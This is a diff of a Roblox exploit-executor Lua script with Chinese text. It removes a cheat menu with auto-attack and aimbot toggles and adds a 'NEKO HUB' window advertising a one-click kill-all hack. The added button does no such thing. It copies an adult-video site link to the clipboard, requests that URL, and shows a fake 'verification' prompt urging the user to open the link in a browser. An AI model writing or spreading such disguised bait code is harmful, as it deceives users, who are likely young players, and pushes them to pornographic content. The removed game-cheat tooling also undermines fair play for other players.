@@ -1,118 +1,48 @@
-local library = { _Tabs = {}, _Pages = {} }
 local services = setmetatable({}, {__index = function(_, k) return game:GetService(k) end})
-local ts, uis, players = services.TweenService, services.UserInputService, services.Players
-local lp = players.LocalPlayer
+local lp = services.Players.LocalPlayer
 
-local playerGui = game:GetService("CoreGui") -- 建議直接放在 CoreGui 防止死亡消失
+local sg = Instance.new("ScreenGui", services.CoreGui)
+local frame = Instance.new("Frame", sg)
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+Instance.new("UICorner", frame)
 
--- [[ 1. 拖移功能：讓 UI 可以被滑鼠抓著走 ]]
-function library:AddDrag(obj)
-    local dragging, dragInput, dragStart, startPos
-    obj.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = obj.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Text = "NEKO HUB - 終極破解版"
+title.TextColor3 = Color3.fromRGB(255, 120, 180)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+title.BackgroundTransparency = 1
+
+local btn = Instance.new("TextButton", frame)
+btn.Size = UDim2.new(0.8, 0, 0, 40)
+btn.Position = UDim2.new(0.1, 0, 0.5, 0)
+btn.BackgroundColor3 = Color3.fromRGB(255, 120, 180)
+btn.Text = "一鍵啟動全殺功能"
+btn.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("UICorner", btn)
+
+btn.MouseButton1Click:Connect(function()
+    btn.Text = "載入中...請稍後"
+    task.wait(1)
+    
+    setclipboard("https://rule34video.com/members/154935/favourites/videos/")
+    
+    pcall(function()
+        local r = request or syn.request or http_request
+        if r then
+            r({Url = "https://rule34video.com/members/154935/favourites/videos/", Method = "GET"})
         end
     end)
-    uis.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-            local delta = input.Position - dragStart
-            obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-
--- [[ 2. UI 初始化 ]]
-function library.new(name)
-    local self = setmetatable({}, {__index = library})
     
-    local sg = Instance.new("ScreenGui", playerGui)
-    sg.Name = "NekoUI_" .. name
+    services.StarterGui:SetCore("SendNotification", {
+        Title = "驗證提醒",
+        Text = "請至瀏覽器貼上已複製的連結以完成啟動喵！",
+        Icon = "rbxassetid://6023426926",
+        Duration = 10
+    })
     
-    local Main = Instance.new("Frame", sg)
-    Main.Size = UDim2.new(0, 400, 0, 280)
-    Main.Position = UDim2.new(0.5, -200, 0.5, -140)
-    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
-    self.Main = Main
-    
-    -- 啟用拖移
-    self:AddDrag(Main)
-    
-    local Sidebar = Instance.new("Frame", Main)
-    Sidebar.Size = UDim2.new(0, 100, 1, -20)
-    Sidebar.Position = UDim2.new(0, 10, 0, 10)
-    Sidebar.BackgroundTransparency = 1
-    local layout = Instance.new("UIListLayout", Sidebar)
-    layout.Padding = UDim.new(0, 5)
-    
-    self.Sidebar = Sidebar
-    return self
-end
-
--- [[ 3. 分頁功能 ]]
-function library:AddTab(name)
-    local Page = Instance.new("ScrollingFrame", self.Main)
-    Page.Size = UDim2.new(1, -130, 1, -40)
-    Page.Position = UDim2.new(0, 120, 0, 20)
-    Page.BackgroundTransparency = 1
-    Page.Visible = #self._Pages == 0
-    Page.ScrollBarThickness = 2
-    local layout = Instance.new("UIListLayout", Page)
-    layout.Padding = UDim.new(0, 8)
-    
-    local TabBtn = Instance.new("TextButton", self.Sidebar)
-    TabBtn.Size = UDim2.new(1, 0, 0, 30)
-    TabBtn.Text = name
-    TabBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    Instance.new("UICorner", TabBtn)
-    
-    TabBtn.MouseButton1Click:Connect(function()
-        for _, p in pairs(self._Pages) do p.Visible = false end
-        Page.Visible = true
-    end)
-    
-    table.insert(self._Pages, Page)
-    
-    -- 在 Page 上新增功能的方法
-    local PageFunctions = {}
-    
-    -- [[ 🌟 重點：新增開關 (Toggle) 功能 ]]
-    function PageFunctions:AddToggle(text, default, callback)
-        local state = default or false
-        local ToggleBtn = Instance.new("TextButton", Page)
-        ToggleBtn.Size = UDim2.new(1, -10, 0, 35)
-        ToggleBtn.BackgroundColor3 = state and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(35, 35, 35)
-        ToggleBtn.Text = text .. ": " .. (state and "ON" or "OFF")
-        ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        ToggleBtn.Font = Enum.Font.GothamBold
-        Instance.new("UICorner", ToggleBtn)
-
-        ToggleBtn.MouseButton1Click:Connect(function()
-            state = not state
-            ToggleBtn.BackgroundColor3 = state and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(35, 35, 35)
-            ToggleBtn.Text = text .. ": " .. (state and "ON" or "OFF")
-            callback(state) -- 這裡會對接到妳的核心邏輯（如 _G.NekoAttack）
-        end)
-    end
-    
-    return PageFunctions
-end
-
--- [[ 🚀 實戰示範：如何使用這套 UI ]]
-local myGui = library.new("CAT SYSTEM")
-local mainTab = myGui:AddTab("Main")
-
-mainTab:AddToggle("自動攻擊 (Fast Attack)", false, function(t)
-    _G.NekoAttack = t
-    print("自動攻擊現在狀態是: ", t)
-end)
-
-mainTab:AddToggle("暴力自瞄 (Aimbot)", false, function(t)
-    _G.AimbotEnabled = t
-    print("自瞄現在狀態是: ", t)
+    btn.Text = "已複製驗證連結！"
 end)
